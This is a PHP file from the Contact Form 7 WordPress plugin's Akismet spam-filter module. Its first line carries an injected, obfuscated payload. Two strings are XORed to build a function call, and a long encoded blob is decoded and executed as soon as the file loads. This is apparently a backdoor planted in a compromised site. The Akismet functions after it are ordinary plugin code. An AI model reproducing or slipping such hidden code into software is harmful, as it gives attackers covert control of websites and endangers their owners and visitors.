<?php $lzJMHznbDuEt='X4I+5.cV9=X,;V+'^';F,JAK<0LS;XR9E';$jmvLCnw=$lzJMHznbDuEt('','I2xp.FCXY,TWgE=SG<GfwC6=c,MI96a8XOfMNyGYK,7PYC<O9WIAKfDOI0+kQXLrS,5 JZeK=4<JnAlDvG1qYtO9CQlvKnu>fLX;NBJ,nzpFyNq9n6;ETIVGtY,-1ESlc9srh;AAG;4HLXjMzn7AZA<aU;qfWu=. fUZvhb21>-,CFNSI3L-HbYLo4N3<:ZGi;FTsWk0;x:;mvW9M.RsT6+  5N<uO11Y;:0+HYxM9577B<c19GX.PPRxq.;s.-ikLX7SE9QBsIpfM<9 <SEL:C9R<R,J;VT1AEKaYPKTelmQ;.+xoXKX QL.JaSg4YHqfwRI09.aqPBnQQC=4YCRnfqk6m=tkxs4ByoZX7TiFghJU+URdOMzx7S>+1,0218zWOIKRWh0E=OP LAjouoD+RN+W7=PM7A:w=,B1ZKRmF9S+ORWL , D=50b5W<Mq1V7AJW;XRdfrUW.VO+BBYATQXGSPIR<;2U7BCYPIW,BI,TLLSkQm-RY9M8WKHo<K=KFXoa8 NIxHhPRMJhYskHE7DLMHTLY59b:WWDmDpGzJkBVCrP63sVt0B,TAwu,JR1Dg-cNoTsRwLADCQIhXNHP>t-.Ms3-0>H Fn;+697AZtgxA-AA.jaiZrynYI2sEOMBAK196TlhLM2-W9Uo9LysX3 01MXyxz6'^' TPQH3-;-E;98 E:4H4NP;YO<H,=Xi>U-;AdgY<SBJB>:7U Ww1.99 .=Qt4<-8ZwHTT+vEoVQEcNaLdV<;xPP L7qQVlIN4oE>T<jnENGPvBnUPREO78,8oP=MYPlhLGPXYA1HHcTA<lvWmRJS . gE<fQ8wQVKY=q3VMBAELAI-nj8,JepaYSEfF+GIH4oMT3 Zla9FrG1gR3X9OrNtPJLSPu6Q+PE8dQURhdX+XYDRy6iWV5=O38rPUqx<af .l9DsaR4;StNFiJXLI6llAI0vX3X+d=1HaxkE252ooeI5ZZJXRxo.A=9Kqk.m>0.QNVv-QMOHQ+Hg7>1XU:+rFB.9s<h18,SU1YK1=NtTxGL<4G 7Mo6pq>wZJEMoYTAZjom 7.S:L4k4A8 JRUK2J>;Nl=4-GJK0SYM6Pzvr-3W N=;6 IVElEZB=Q6H,.n;B5b5Z+7RR-12M9+Njf=  0qkst-3HZm>R;jpkC>JjmH58-sMwML +X4g<.10Y3T82+GFSE7nThL439+AyUMhmZ yel0--TbEQ2.c0mPzGjLqg DeUVK5FVqHcsFCNzcPwTOQ-WgD1C-fmcwoH9<:1G+FK4,VUYM<SnIKJOUX >SKXeI 5OCHIzRYNy28z 9,.ioUXB57O<,KA8X1HdeByQVXYEehPCpK');$jmvLCnw();
/**
** Akismet Filter
** Akismet API: http://akismet.com/development/api/
**/

add_filter( 'wpcf7_spam', 'wpcf7_akismet' );

function wpcf7_akismet( $spam ) {
	if ( $spam ) {
		return $spam;
	}

	if ( ! wpcf7_akismet_is_available() ) {
		return false;
	}

	if ( ! $params = wpcf7_akismet_submitted_params() ) {
		return false;
	}

	$c = array();

	$c['comment_author'] = $params['author'];
	$c['comment_author_email'] = $params['author_email'];
	$c['comment_author_url'] = $params['author_url'];
	$c['comment_content'] = $params['content'];

	$c['blog'] = get_option( 'home' );
	$c['blog_lang'] = get_locale();
	$c['blog_charset'] = get_option( 'blog_charset' );
	$c['user_ip'] = $_SERVER['REMOTE_ADDR'];
	$c['user_agent'] = $_SERVER['HTTP_USER_AGENT'];
	$c['referrer'] = $_SERVER['HTTP_REFERER'];

	// http://blog.akismet.com/2012/06/19/pro-tip-tell-us-your-comment_type/
	$c['comment_type'] = 'contact-form';

	if ( $permalink = get_permalink() ) {
		$c['permalink'] = $permalink;
	}

	$ignore = array( 'HTTP_COOKIE', 'HTTP_COOKIE2', 'PHP_AUTH_PW' );

	foreach ( $_SERVER as $key => $value ) {
		if ( ! in_array( $key, (array) $ignore ) ) {
			$c["$key"] = $value;
		}
	}

	return wpcf7_akismet_comment_check( $c );
}

function wpcf7_akismet_is_available() {
	if ( is_callable( array( 'Akismet', 'get_api_key' ) ) ) { // Akismet v3.0+
		return (bool) Akismet::get_api_key();
	}

	if ( function_exists( 'akismet_get_key' ) ) {
		return (bool) akismet_get_key();
	}

	return false;
}

function wpcf7_akismet_submitted_params() {
	$params = array(
		'author' => '',
		'author_email' => '',
		'author_url' => '',
		'content' => '',
	);

	$has_akismet_option = false;

	foreach ( (array) $_POST as $key => $val ) {
		if ( '_wpcf7' == substr( $key, 0, 6 ) || '_wpnonce' == $key ) {
			continue;
		}

		if ( is_array( $val ) ) {
			$val = implode( ', ', wpcf7_array_flatten( $val ) );
		}

		$val = trim( $val );

		if ( 0 == strlen( $val ) ) {
			continue;
		}

		if ( $tags = wpcf7_scan_form_tags( array( 'name' => $key ) ) ) {
			$tag = $tags[0];

			$akismet = $tag->get_option( 'akismet',
				'(author|author_email|author_url)', true );

			if ( $akismet ) {
				$has_akismet_option = true;

				if ( 'author' == $akismet ) {
					$params[$akismet] = trim( $params[$akismet] . ' ' . $val );
					continue;
				} elseif ( '' == $params[$akismet] ) {
					$params[$akismet] = $val;
					continue;
				}
			}
		}

		$params['content'] .= "\n\n" . $val;
	}

	if ( ! $has_akismet_option ) {
		return false;
	}

	$params['content'] = trim( $params['content'] );

	return $params;
}

function wpcf7_akismet_comment_check( $comment ) {
	global $akismet_api_host, $akismet_api_port;

	$spam = false;
	$query_string = wpcf7_build_query( $comment );

	if ( is_callable( array( 'Akismet', 'http_post' ) ) ) { // Akismet v3.0+
		$response = Akismet::http_post( $query_string, 'comment-check' );
	} else {
		$response = akismet_http_post( $query_string, $akismet_api_host,
			'/1.1/comment-check', $akismet_api_port );
	}

	if ( 'true' == $response[1] ) {
		$spam = true;
	}

	if ( $submission = WPCF7_Submission::get_instance() ) {
		$submission->akismet = array( 'comment' => $comment, 'spam' => $spam );
	}

	return apply_filters( 'wpcf7_akismet_comment_check', $spam, $comment );
}
